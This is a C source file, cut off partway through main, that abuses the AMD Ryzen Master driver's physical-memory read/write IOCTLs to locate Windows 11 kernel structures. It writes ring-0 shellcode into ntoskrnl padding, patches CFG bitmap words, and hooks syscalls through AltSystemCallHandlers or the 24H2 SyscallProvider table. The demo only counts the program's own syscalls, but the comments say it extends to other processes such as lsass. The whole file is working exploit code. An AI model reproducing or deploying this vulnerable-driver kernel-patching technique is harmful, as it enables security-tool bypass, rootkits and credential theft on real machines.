/*
 * altsyscall_hook.c — AltSystemCallHandlers hook via AMD physical R/W
 *
 * Windows 11 21H2+ added an "alternative syscall dispatch" mechanism:
 * KPROCESS.AltSystemCallHandlers (pointer to an array of handler entries).
 * When non-NULL, every syscall from that process calls the registered handler
 * BEFORE the real syscall executes.  Handler receives KTRAP_FRAME*.
 *
 * We intercept all syscalls from our OWN process to log syscall numbers:
 *   1. Find own EPROCESS PA and kernel CR3
 *   2. Scan KiSystemCall64 in ntoskrnl .text for the offset of
 *      AltSystemCallHandlers by looking for the CMP pattern
 *   3. Find CC-padding region (handler shellcode) + .data region (counter table)
 *   4. Build fake _ALT_SYSTEM_CALL_HANDLER_TABLE in .data
 *   5. Write handler shellcode into CC region
 *   6. phys_write handler table KVA into KPROCESS + alt_off
 *   7. Execute syscalls, read back counter
 *   8. Restore
 *
 * Hooking own process avoids needing lsass EPROCESS and is safer for testing.
 * Extending to another process: just use that process's EPROCESS PA.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o altsyscall_hook.exe altsyscall_hook.c -lkernel32 -ladvapi32
 *
 * Requires: AMDRyzenMasterDriverV20, Admin rights, Windows 11 (build >= 22000).
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES (compact)
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vn[256]; DWORD vs, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;; i++) {
        vs = sizeof vn; DWORD vd = 0;
        if (RegEnumValueA(h, i, vn, &vs, NULL, &type, NULL, &vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vd < 20) continue;
        buf = malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h, vn, NULL, NULL, buf, &vd) == ERROR_SUCCESS) { sz = vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz < 20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf + 16); uint8_t *p = buf + 20;
    for (DWORD i = 0; i < cnt && g_nranges < MAX_RANGES; i++, p += 20) {
        g_ranges[g_nranges].base = *(uint64_t*)(p + 4);
        g_ranges[g_nranges].size = *(uint64_t*)(p + 12);
        g_nranges++;
    }
    free(buf);
}
static int in_range(uint64_t pa, uint32_t len)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base && pa + len <= g_ranges[i].base + g_ranges[i].size) return 1;
    return 0;
}
static int open_dev(void)
{
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    return g_dev != INVALID_HANDLE_VALUE;
}
static void close_dev(void) { if (g_dev != INVALID_HANDLE_VALUE) CloseHandle(g_dev); }
static int phys_read(uint64_t pa, void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t ib[12]; *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    uint8_t ob[12+4096]; DWORD r = 0;
    if (!DeviceIoControl(g_dev, IOCTL_PHYS_READ, ib, 12, ob, 12+len, &r, NULL)) return 0;
    memcpy(buf, ob+12, len); return 1;
}
static int phys_write(uint64_t pa, const void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t *ib = malloc(12+len); if (!ib) return 0;
    *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    memcpy(ib+12, buf, len);
    DWORD r = 0; int ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, ib, 12+len, NULL, 0, &r, NULL);
    free(ib); return ok;
}
static uint64_t phys_read64(uint64_t pa) { uint64_t v=0; phys_read(pa,&v,8); return v; }
static uint8_t  phys_read8 (uint64_t pa) { uint8_t  v=0; phys_read(pa,&v,1); return v; }

/* ══════════════════════════════════════════════════════════════════════════
 * §2  KERNEL MODULE + NTOSKRNL PA
 * ══════════════════════════════════════════════════════════════════════════ */

typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
typedef struct {
    ULONG Next; UCHAR N;
    struct { PVOID Section, Mapped, Image; ULONG Size, Flags; USHORT Ld, In, Cnt, Off; char Path[256]; } M[1];
} SYSMOD;

static uint64_t g_nt_va = 0, g_nt_pa = 0;
static uint32_t g_nt_size = 0;
static char     g_nt_path[256];

static int load_nt_module(void)
{
    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!fn) return 0;
    ULONG sz = 0; fn(11, NULL, 0, &sz); sz += 4096;
    BYTE *buf = malloc(sz); if (!buf) return 0;
    if (fn(11, buf, sz, &sz)) { free(buf); return 0; }
    SYSMOD *mi = (SYSMOD*)buf;
    for (UCHAR i = 0; i < mi->N; i++) {
        const char *fn2 = mi->M[i].Path + mi->M[i].Off;
        if (_stricmp(fn2, "ntoskrnl.exe") && _stricmp(fn2, "ntkrnlmp.exe")) continue;
        g_nt_va   = (uint64_t)mi->M[i].Image;
        g_nt_size = mi->M[i].Size;
        strncpy(g_nt_path, mi->M[i].Path, 255);
        if (_strnicmp(g_nt_path, "\\SystemRoot\\", 12) == 0) {
            char tmp[256]; GetSystemDirectoryA(tmp, sizeof tmp);
            memmove(g_nt_path + strlen(tmp), g_nt_path + 11, strlen(g_nt_path) - 10);
            memcpy(g_nt_path, tmp, strlen(tmp));
        }
        free(buf); return 1;
    }
    free(buf); return 0;
}

static int find_nt_pa(void)
{
    HANDLE hf = CreateFileA(g_nt_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    uint8_t fp[64] = {0}; DWORD rd = 0; ReadFile(hf, fp, 64, &rd, NULL); CloseHandle(hf);
    if (rd < 64) return 0;
    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = (g_ranges[r].base + 0x1FFFFF) & ~0x1FFFFFULL;
        uint64_t end  = g_ranges[r].base + g_ranges[r].size;
        for (uint64_t pa = base; pa + g_nt_size < end; pa += 0x200000) {
            uint8_t b[64]; if (!phys_read(pa, b, 64)) continue;
            if (!memcmp(b, fp, 64)) { g_nt_pa = pa; return 1; }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  PE SECTIONS
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct { uint64_t rva_s, rva_e; uint32_t ch; char name[9]; } Sec;
#define MAX_SECS 32
static Sec g_secs[MAX_SECS]; static int g_nsecs = 0;
static void load_secs(void)
{
    uint8_t h[4096]; if (!phys_read(g_nt_pa, h, 4096)) return;
    uint32_t po = *(uint32_t*)(h + 0x3C); if (po + 0x108 > 4096) return;
    uint8_t *pe = h + po;
    if (*(uint32_t*)pe != 0x00004550) return;
    uint16_t ns = *(uint16_t*)(pe+6), opt = *(uint16_t*)(pe+20);
    uint8_t *s = pe + 24 + opt;
    for (int i = 0; i < ns && g_nsecs < MAX_SECS; i++, s += 40) {
        g_secs[g_nsecs].rva_s = *(uint32_t*)(s+12);
        g_secs[g_nsecs].rva_e = g_secs[g_nsecs].rva_s + *(uint32_t*)(s+16);
        g_secs[g_nsecs].ch    = *(uint32_t*)(s+36);
        memcpy(g_secs[g_nsecs].name, s, 8); g_secs[g_nsecs].name[8] = 0;
        g_nsecs++;
    }
}
static uint64_t find_cc_rva(int min)
{
    for (int s = 0; s < g_nsecs; s++) {
        if (!(g_secs[s].ch & 0x20000000)) continue;
        int run = 0; uint64_t rs = 0;
        for (uint64_t o = g_secs[s].rva_s; o < g_secs[s].rva_e; o++) {
            if (phys_read8(g_nt_pa + o) == 0xCC) { if (!run) rs = o; if (++run >= min) return rs; }
            else run = 0;
        }
    }
    return 0;
}
static uint64_t find_data_zero(int min)
{
    for (int s = 0; s < g_nsecs; s++) {
        if (!(g_secs[s].ch & 0x80000000) || (g_secs[s].ch & 0x20000000)) continue;
        int run = 0; uint64_t rs = 0;
        for (uint64_t o = g_secs[s].rva_s; o < g_secs[s].rva_e; o++) {
            if (phys_read8(g_nt_pa + o) == 0) { if (!run) rs = o; if (++run >= min) return rs; }
            else run = 0;
        }
    }
    return 0;
}

/* Scan .text for: 48 8D 0D xx xx xx xx  4C 8D 3C C1
 *                 LEA rcx,[rip+d32]     LEA r15,[rcx+rax*8]
 * Returns KVA of PspServiceDescriptorGroupTable. */
static uint64_t scan_psdgt(void)
{
    for (int s = 0; s < g_nsecs; s++) {
        if (!(g_secs[s].ch & 0x20000000)) continue;
        for (uint64_t o = g_secs[s].rva_s; o + 11 <= g_secs[s].rva_e; o++) {
            if (phys_read8(g_nt_pa + o    ) != 0x48) continue;
            if (phys_read8(g_nt_pa + o + 1) != 0x8D) continue;
            if (phys_read8(g_nt_pa + o + 2) != 0x0D) continue;
            if (phys_read8(g_nt_pa + o + 7) != 0x4C) continue;
            if (phys_read8(g_nt_pa + o + 8) != 0x8D) continue;
            if (phys_read8(g_nt_pa + o + 9) != 0x3C) continue;
            if (phys_read8(g_nt_pa + o +10) != 0xC1) continue;
            int32_t disp; uint8_t db[4];
            phys_read(g_nt_pa + o + 3, db, 4); memcpy(&disp, db, 4);
            uint64_t tgt = g_nt_va + o + 7 + (int64_t)disp;
            int in_x = 0;
            for (int i = 0; i < g_nsecs && !in_x; i++)
                if ((g_secs[i].ch & 0x20000000) &&
                    tgt >= g_nt_va + g_secs[i].rva_s &&
                    tgt <  g_nt_va + g_secs[i].rva_e) in_x = 1;
            if (!in_x) return tgt;
        }
    }
    return 0;
}

/* Scan .text for: 4C 8B 1D xx xx xx xx  48 85 C0  0F 8D
 *                 MOV r11,[rip+d32]      TEST rax,rax  JGE
 * Returns VA of the _guard_icall_bitmap pointer variable. */
static uint64_t find_cfg_bitmap_ptr_va(void)
{
    for (int s = 0; s < g_nsecs; s++) {
        if (!(g_secs[s].ch & 0x20000000)) continue;
        for (uint64_t o = g_secs[s].rva_s; o + 11 <= g_secs[s].rva_e; o++) {
            if (phys_read8(g_nt_pa + o    ) != 0x4C) continue;
            if (phys_read8(g_nt_pa + o + 1) != 0x8B) continue;
            if (phys_read8(g_nt_pa + o + 2) != 0x1D) continue;
            if (phys_read8(g_nt_pa + o + 7) != 0x48) continue;
            if (phys_read8(g_nt_pa + o + 8) != 0x85) continue;
            if (phys_read8(g_nt_pa + o + 9) != 0xC0) continue;
            if (phys_read8(g_nt_pa + o +10) != 0x0F) continue;
            if (phys_read8(g_nt_pa + o +11) != 0x8D) continue;
            int32_t disp; uint8_t db[4];
            phys_read(g_nt_pa + o + 3, db, 4); memcpy(&disp, db, 4);
            uint64_t tgt = g_nt_va + o + 7 + (int64_t)disp;
            int in_x = 0;
            for (int i = 0; i < g_nsecs && !in_x; i++)
                if ((g_secs[i].ch & 0x20000000) &&
                    tgt >= g_nt_va + g_secs[i].rva_s &&
                    tgt <  g_nt_va + g_secs[i].rva_e) in_x = 1;
            if (!in_x) return tgt;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  KERNEL CR3 + VA→PA + OWN EPROCESS
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_kcr3 = 0;

/* PML4 self-referencing slot scan — finds kernel CR3 without using EPROCESS.DTB.
 * Immune to the Win11 26200 false-positive where EPROCESS.DTB = kernel VA. */
static uint64_t find_kernel_cr3(uint64_t nt_va)
{
    uint32_t nt_idx = (uint32_t)((nt_va >> 39) & 0x1FF);
    /* Pass 0: classic self-ref slot 0x1ED (pre-Win10 1703), first 256MB.
     * Pass 1: any kernel-half slot 0x100-0x1FF, first 64MB. */
    for (int pass = 0; pass < 2; pass++) {
        uint64_t scan_limit = (pass == 0) ? 0x10000000ULL : 0x04000000ULL;
        for (int r = 0; r < g_nranges; r++) {
            uint64_t base = (g_ranges[r].base + 0xFFF) & ~0xFFFULL;
            uint64_t end  = g_ranges[r].base + g_ranges[r].size;
            if (base >= scan_limit) continue;
            if (end > scan_limit) end = scan_limit;
            for (uint64_t pa = base; pa + 0x1000 <= end; pa += 0x1000) {
                int found_self = 0;
                if (pass == 0) {
                    uint64_t e = phys_read64(pa + 0x1ED * 8);
                    if ((e & 1) && (e & 0x000FFFFFFFFFF000ULL) == pa) found_self = 1;
                } else {
                    for (uint32_t s = 0x100; s <= 0x1FF && !found_self; s++) {
                        uint64_t e = phys_read64(pa + s * 8);
                        if ((e & 1) && (e & 0x000FFFFFFFFFF000ULL) == pa) found_self = 1;
                    }
                }
                if (!found_self) continue;
                /* Reject KPTI shadow tables: ntoskrnl PML4 entry must be present */
                uint64_t nt_e = phys_read64(pa + nt_idx * 8);
                if (!(nt_e & 1)) continue;
                return pa;
            }
        }
    }
    return 0;
}

static uint64_t kva_to_pa(uint64_t va)
{
    if (!g_kcr3) return 0;
    uint64_t e = phys_read64((g_kcr3 & ~0xFFFULL) + ((va>>39)&0x1FF)*8);
    if (!(e&1)) return 0;
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>30)&0x1FF)*8);
    if (!(e&1)) return 0;
    if (e & (1ULL<<7)) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>21)&0x1FF)*8);
    if (!(e&1)) return 0;
    if (e & (1ULL<<7)) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>12)&0x1FF)*8);
    if (!(e&1)) return 0;
    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

/* Dual-layout table: Win11 24H2+ first, then Win10/pre-24H2 */
typedef struct { uint32_t pid; uint32_t links; uint32_t name; } EpLyt;
static const EpLyt g_ep_lyts[] = {
    { 0x1D0, 0x1D8, 0x338 }, /* Win11 24H2+ (build 26100+) */
    { 0x440, 0x448, 0x5A8 }, /* Win10 / Win11 pre-24H2     */
    { 0x440, 0x448, 0x5B8 }, /* Win10 variant              */
};
static const EpLyt *g_ep_lyt = NULL;

static uint64_t find_system_pa(void)
{
    uint8_t page[0x1000];
    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = (g_ranges[r].base + 0xFFF) & ~0xFFFULL;
        uint64_t end  = g_ranges[r].base + g_ranges[r].size;
        if (end > base + 0x20000000ULL) end = base + 0x20000000ULL; /* 512 MB cap */
        for (uint64_t page_pa = base; page_pa < end; page_pa += 0x1000) {
            if (!phys_read(page_pa, page, 0x1000)) continue;
            for (int sub = 0; sub <= (int)(0x1000 - 0x400); sub += 8) {
                for (int vi = 0; vi < 3; vi++) {
                    const EpLyt *L = &g_ep_lyts[vi];
                    if ((sub + L->pid + 4) > 0x1000) continue;
                    uint32_t pid_val = 0; memcpy(&pid_val, page + sub + L->pid, 4);
                    if (pid_val != 4) continue;
                    if ((sub + L->name + 8) > 0x1000) continue;
                    char nm[8]; memcpy(nm, page + sub + L->name, 8);
                    if (memcmp(nm, "System\0\0", 7) != 0) continue;
                    uint64_t dtb; memcpy(&dtb, page + sub + 0x028, 8);
                    if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
                    if ((sub + L->links + 16) > 0x1000) continue;
                    uint64_t flink, blink;
                    memcpy(&flink, page + sub + L->links,     8);
                    memcpy(&blink, page + sub + L->links + 8, 8);
                    if ((flink >> 48) != 0xFFFF || (blink >> 48) != 0xFFFF) continue;
                    g_ep_lyt = L;
                    return page_pa + (uint64_t)sub;
                }
            }
        }
    }
    return 0;
}

static uint64_t find_own_eproc_pa(uint64_t system_pa)
{
    if (!g_ep_lyt) return 0;
    uint32_t links   = g_ep_lyt->links;
    uint32_t pid_off = g_ep_lyt->pid;

    DWORD pid = GetCurrentProcessId();
    uint64_t flink_va = phys_read64(system_pa + links);
    if (!flink_va) return 0;
    uint64_t flink_pa = kva_to_pa(flink_va);
    if (!flink_pa) return 0;
    uint64_t blink_va = phys_read64(flink_pa + 8);
    uint64_t own_ep_va = blink_va - links;

    uint64_t cur_va = own_ep_va;
    for (int n = 0; n < 512; n++) {
        uint64_t cur_pa = kva_to_pa(cur_va);
        if (!cur_pa) break;
        if ((DWORD)phys_read64(cur_pa + pid_off) == pid) return cur_pa;
        uint64_t nxt_flink = phys_read64(cur_pa + links);
        if (!nxt_flink) break;
        cur_va = nxt_flink - links;
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  SCAN KISYSTEMCALL64 FOR ALTSYSCALLHANDLERS OFFSET
 *
 * KiSystemCall64 loads KPROCESS pointer and checks AltSystemCallHandlers:
 *   cmp qword ptr [r/rXX + disp], 0   ; 48 83 B? XX XX 00 00 00
 * or:
 *   mov rax, [r/rXX + disp]
 *   test rax, rax
 * We scan KiSystemCall64's first 0x400 bytes for CMP patterns with
 * displacement in range [0x400, 0x600] (plausible KPROCESS field range).
 * ══════════════════════════════════════════════════════════════════════════ */

static uint32_t scan_altsyscall_offset(void)
{
    /* First, find KiSystemCall64 via ntoskrnl export */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    /*
     * We can't directly call GetProcAddress on ntoskrnl from user mode.
     * Instead, scan ntoskrnl .text for a known byte pattern near the
     * syscall dispatch CMP instruction.
     *
     * Known signature for AltSystemCallHandlers check (Win11 22H2/24H2):
     *   48 83 B9 XX XX 00 00 00   cmp qword [rcx + disp32], 0
     *   74 XX                     jz (skip handler)
     *
     * Pattern: 48 83 B9 ?? ?? 00 00 00 74
     */
    for (int s = 0; s < g_nsecs; s++) {
        if (!(g_secs[s].ch & 0x20000000)) continue; /* executable */
        uint64_t rva_s = g_secs[s].rva_s, rva_e = g_secs[s].rva_e;
        for (uint64_t o = rva_s; o + 9 < rva_e; o++) {
            uint8_t b0 = phys_read8(g_nt_pa + o);
            if (b0 != 0x48) continue;
            uint8_t b1 = phys_read8(g_nt_pa + o + 1);
            if (b1 != 0x83) continue;
            uint8_t b2 = phys_read8(g_nt_pa + o + 2);
            /* ModRM byte: 0xB9 = mod=10, reg=7(CMP), r/m=1(RCX) */
            if (b2 != 0xB9 && b2 != 0xBB) continue;
            /* displacement at bytes [3..6] */
            uint32_t disp = 0; phys_read(g_nt_pa + o + 3, &disp, 4);
            if (disp < 0x400 || disp > 0x600) continue;
            /* byte 7 = 0, byte 8 = 0x74 (JZ) or 0x75 (JNZ) */
            if (phys_read8(g_nt_pa + o + 7) != 0 || phys_read8(g_nt_pa + o + 8) != 0) continue;
            uint8_t jmp = phys_read8(g_nt_pa + o + 9);
            if (jmp != 0x74 && jmp != 0x75) continue;
            printf("[+] AltSyscall offset scan: found disp=0x%X at RVA 0x%"PRIx64"\n", disp, o);
            return disp;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5b  WIN11 24H2+ SYSCALL PROVIDER
 *
 * KPROCESS.AltSystemCallHandlers was removed in Win11 24H2.  Replacement:
 *   EPROCESS.SyscallProviderDispatchContext.Slot (+0x7D4) — index into
 *   PspServiceDescriptorGroupTable (found by scanning PsRegisterAltSystemCallHandler).
 *   KTHREAD.DISPATCHER_HEADER.DebugActive bit 5 (+0x003 & 0x20) arms it.
 *
 * Provider REPLACES syscalls (no transparent fall-through), so a worker
 * thread manages the hook while the main thread provides the syscalls.
 * Worker's KTHREAD has no AltSyscall bit → DeviceIoControl works normally.
 * ══════════════════════════════════════════════════════════════════════════ */

#define SDG_ROW_SZ    0x18u
#define EP24_SLOT_OFF 0x7D4u
#define ETHREAD_TL    0x578u
#define EP24_TLH      0x370u
#define KTHREAD_DA    0x003u
#define ALTSYSC_BIT   0x20u

/* Scan ntoskrnl export table (physical) for named symbol → RVA, 0 on fail */
static uint32_t nt_export_rva(const char *sym)
{
    uint8_t h[256];
    if (!phys_read(g_nt_pa, h, 64)) return 0;
    if (h[0] != 'M' || h[1] != 'Z') return 0;
    uint32_t peoff; memcpy(&peoff, h + 0x3C, 4);
    if (!peoff || peoff + 0x100 > g_nt_size) return 0;
    if (!phys_read(g_nt_pa + peoff, h, 256)) return 0;
    if (*(uint32_t*)h != 0x00004550) return 0;
    uint32_t expRVA; memcpy(&expRVA, h + 0x18 + 0x70, 4);
    if (!expRVA || expRVA >= g_nt_size) return 0;
    uint8_t ed[40]; if (!phys_read(g_nt_pa + expRVA, ed, 40)) return 0;
    uint32_t nNames, rvaFn, rvaNames, rvaOrd;
    memcpy(&nNames,   ed + 24, 4);
    memcpy(&rvaFn,    ed + 28, 4);
    memcpy(&rvaNames, ed + 32, 4);
    memcpy(&rvaOrd,   ed + 36, 4);
    if (!nNames || !rvaFn || !rvaNames || !rvaOrd || nNames > 100000) return 0;
    for (uint32_t i = 0; i < nNames; i++) {
        uint32_t nr = 0;
        if (!phys_read(g_nt_pa + rvaNames + i*4, &nr, 4) || !nr) continue;
        char nm[80] = {0}; if (!phys_read(g_nt_pa + nr, nm, 79)) continue;
        if (strcmp(nm, sym)) continue;
        uint16_t ord = 0; if (!phys_read(g_nt_pa + rvaOrd + i*2, &ord, 2)) continue;
        uint32_t fnRVA = 0; phys_read(g_nt_pa + rvaFn + ord*4, &fnRVA, 4);
        return fnRVA;
    }
    return 0;
}

/* Scan function body (phys) for first RIP-relative LEA/MOV to non-.text data.
 * Returns absolute KVA, 0 on fail. */
static uint64_t scan_rip_data_ref(uint64_t fn_pa, uint64_t fn_va, int len)
{
    for (int i = 0; i + 7 < len; i++) {
        uint8_t b[8]; if (!phys_read(fn_pa + (uint32_t)i, b, 8)) continue;
        int o = 0;
        if ((b[0] & 0xFB) == 0x48) o = 1;
        if (i + o + 6 > len) continue;
        if (b[o] != 0x8D && b[o] != 0x8B) continue;
        if ((b[o+1] & 0xC7) != 0x05) continue;
        int32_t disp; memcpy(&disp, b + o + 2, 4);
        uint64_t rip = fn_va + (uint64_t)(i + o + 6);
        uint64_t tgt = (uint64_t)((int64_t)rip + disp);
        if ((tgt >> 48) != 0xFFFF) continue;
        int in_x = 0;
        for (int s = 0; s < g_nsecs && !in_x; s++)
            if ((g_secs[s].ch & 0x20000000) &&
                tgt >= g_nt_va + g_secs[s].rva_s &&
                tgt <  g_nt_va + g_secs[s].rva_e) in_x = 1;
        if (in_x) continue;
        return tgt;
    }
    return 0;
}

typedef struct {
    uint64_t     main_et_pa;
    uint64_t     own_pa;
    uint64_t     row1_pa;
    uint8_t      row1_save[SDG_ROW_SZ];
    uint64_t     counter_pa;
    uint64_t     data_pa;
    uint8_t      dt_save[512];
    int          dt_save_len;
    uint64_t     cc_pa;
    uint8_t      cc_save[32];
    int          cc_len;
    uint8_t      da_save;
    uint32_t     slot_save;
    uint64_t     cfg_word_pa;    /* PA of 8-byte CFG bitmap word, 0 if not patched */
    uint64_t     cfg_word_save;  /* original CFG bitmap word to restore */
    volatile LONG trigger_done; /* 0=init, -1=hook armed, 1=syscalls done */
    volatile LONG done;
    uint64_t     counter_val;
} W24Ctx;

static DWORD WINAPI worker24(LPVOID arg)
{
    W24Ctx *c = (W24Ctx *)arg;
    uint32_t s1 = 1;
    phys_write(c->own_pa + EP24_SLOT_OFF, &s1, 4);
    uint8_t da = c->da_save | ALTSYSC_BIT;
    phys_write(c->main_et_pa + KTHREAD_DA, &da, 1);
    InterlockedExchange((LONG*)&c->trigger_done, -1); /* armed */

    for (int w = 0; w < 10000; w++) {
        if (InterlockedCompareExchange((LONG*)&c->trigger_done, 1, 1) == 1) break;
        Sleep(1);
    }

    phys_write(c->main_et_pa + KTHREAD_DA, &c->da_save, 1);
    Sleep(5);
    phys_write(c->own_pa + EP24_SLOT_OFF, &c->slot_save, 4);
    c->counter_val = phys_read64(c->counter_pa);
    phys_write(c->row1_pa, c->row1_save, SDG_ROW_SZ);
    phys_write(c->data_pa, c->dt_save, c->dt_save_len);
    phys_write(c->cc_pa, c->cc_save, c->cc_len);
    if (c->cfg_word_pa)
        phys_write(c->cfg_word_pa, &c->cfg_word_save, 8);
    InterlockedExchange((LONG*)&c->done, 1);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  ALT_SYSTEM_CALL_HANDLER_TABLE STRUCTURE
 *
 * Structure (approximate, from Windows 11 research):
 *   +0x00  ULONG Count               = 1
 *   +0x04  ULONG Reserved            = 0
 *   +0x08  PVOID RoutineAddress      = our_handler_kva
 *   +0x10  ULONG FilterMask          = 0xFFFFFFFF (all syscalls)
 *   +0x14  ULONG Reserved2           = 0
 * Total: 0x18 bytes for 1 handler entry
 *
 * Handler prototype: BOOLEAN Handler(PKTRAP_FRAME TrapFrame)
 * Return 0 = proceed with syscall, non-zero = skip
 *
 * .data layout (at sig_rva):
 *   +0x00  table (0x18 bytes)
 *   +0x18  QWORD syscall_counter (incremented by handler)
 *   +0x20  8 bytes orig_kva backup
 * ══════════════════════════════════════════════════════════════════════════ */

#define TABLE_SIZE   0x18
#define COUNTER_OFF  0x18

/*
 * Handler shellcode (ring-0, called as BOOLEAN fn(PKTRAP_FRAME)):
 *   RCX = KTRAP_FRAME*
 *
 *   push rcx
 *   mov  rcx, counter_kva
 *   lock inc qword [rcx]
 *   pop  rcx
 *   xor  eax, eax          ; return 0 (let syscall proceed)
 *   ret
 */
static int build_handler_sc(uint8_t *sc, uint64_t counter_kva)
{
    int i = 0;
    sc[i++] = 0x51;                     /* push rcx */
    sc[i++] = 0x48; sc[i++] = 0xB9;    /* mov rcx, imm64 */
    memcpy(&sc[i], &counter_kva, 8); i += 8;
    /* lock inc qword [rcx] */
    sc[i++] = 0xF0; sc[i++] = 0x48; sc[i++] = 0xFF; sc[i++] = 0x01;
    sc[i++] = 0x59;                     /* pop rcx */
    sc[i++] = 0x31; sc[i++] = 0xC0;    /* xor eax, eax */
    sc[i++] = 0xC3;                     /* ret */
    return i;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §7  MAIN
 * ══════════════════════════════════════════════════════════════════════════ */

int main(void)
{
    puts("=== altsyscall_hook: AltSystemCallHandlers intercept ===");

    /* Check OS build ≥ 22000 */
    OSVERSIONINFOEXW os = { sizeof(os) };
    typedef LONG (WINAPI *RtlGV_t)(OSVERSIONINFOEXW*);
    RtlGV_t RtlGV = (RtlGV_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (RtlGV) RtlGV(&os);
    printf("[+] Windows build: %lu\n", (unsigned long)os.dwBuildNumber);
    if (os.dwBuildNumber < 22000) {
        puts("[-] AltSystemCallHandlers requires Windows 11 build >= 22000");
        return 1;
    }

    if (!open_dev()) { fputs("[-] Cannot open AMD device\n", stderr); return 1; }
    load_ranges();
    if (!g_nranges) { puts("[-] No physical ranges"); close_dev(); return 1; }

    if (!load_nt_module()) { puts("[-] Cannot enumerate kernel modules"); close_dev(); return 1; }
    printf("[+] ntoskrnl VA: %016"PRIx64"\n", g_nt_va);

    if (!find_nt_pa()) { puts("[-] ntoskrnl PA not found"); close_dev(); return 1; }
    printf("[+] ntoskrnl PA: %016"PRIx64"\n", g_nt_pa);

    load_secs();

    /* CR3: prefer PML4 self-ref scan (immune to EPROCESS.DTB false positives) */
    g_kcr3 = find_kernel_cr3(g_nt_va);
    if (g_kcr3)
        printf("[+] Kernel CR3 (PML4 scan): %016"PRIx64"\n", g_kcr3);
    else
        printf("[~] PML4 scan failed, will use EPROCESS.DTB\n");

    uint64_t sys_pa = find_system_pa();
    if (!sys_pa) { puts("[-] System EPROCESS not found"); close_dev(); return 1; }
    if (!g_kcr3) {
        g_kcr3 = phys_read64(sys_pa + 0x028);
        printf("[+] Kernel CR3 (EPROCESS.DTB): %016"PRIx64"\n", g_kcr3);
    }
    if (!g_kcr3) { puts("[-] No CR3 available"); close_dev(); return 1; }

    /* Find own EPROCESS */
    uint64_t own_pa = find_own_eproc_pa(sys_pa);
    if (!own_pa) { puts("[-] Own EPROCESS not found"); close_dev(); return 1; }
    printf("[+] Own EPROCESS PA: %016"PRIx64" (PID %lu)\n",
           own_pa, (unsigned long)GetCurrentProcessId());

    /* ——— Win11 24H2+: SyscallProvider path ——— */
    if (os.dwBuildNumber >= 26100) {
        puts("[*] Win11 24H2+ — using SyscallProvider mechanism");

        /* Find PspServiceDescriptorGroupTable via PsSyscallProviderDispatch signature:
         *   48 8D 0D xx xx xx xx   LEA rcx, [rip+disp32]   → table
         *   4C 8D 3C C1            LEA r15, [rcx+rax*8]
         * PsRegisterAltSystemCallHandler on Win11 26200 accesses PsAltSystemCallHandlers
         * (old mechanism), NOT the table — scanning it gives the wrong address. */
        uint64_t tbl_kva = scan_psdgt();
        if (!tbl_kva) {
            puts("[-] PspServiceDescriptorGroupTable pattern not found in .text");
            close_dev(); return 1;
        }
        uint64_t tbl_pa = kva_to_pa(tbl_kva);
        if (!tbl_pa) {
            puts("[-] PspServiceDescriptorGroupTable PA translation failed");
            close_dev(); return 1;
        }
        printf("[+] PspServiceDescriptorGroupTable KVA: %016"PRIx64"\n", tbl_kva);

